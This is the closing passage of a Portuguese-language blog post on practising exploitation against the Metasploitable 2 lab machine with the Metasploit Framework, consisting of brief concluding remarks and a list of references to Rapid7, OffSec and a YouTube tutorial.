## Considerações finais 

Neste blog post, vimos que a máquina Metasploitable 2 é uma ótima oportunidade para quem deseja aprender sobre segurança cibernética, oferecendo uma ampla gama de vulnerabilidades para explorar. Além disso, o Metasploit Framework também se destaca como uma ferramenta para esse aprendizado, facilitando a identificação e exploração de falhas nesses ambientes. 

## Referências

Rapid7. **Metasploitable 2 Exploitability Guide**. Disponível em: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/

Rapid7. **Metasploit Documentation**. Disponível em: https://docs.metasploit.com

OffSec. **Scanner FTP Auxiliary Modules**. Disponível em: https://www.offsec.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/

InfoSec Pat. **How To Hack and Exploit Port 80 HTTP Metasploitable 2**. Disponível em: https://www.youtube.com/watch?v=HH7DPfYTfoI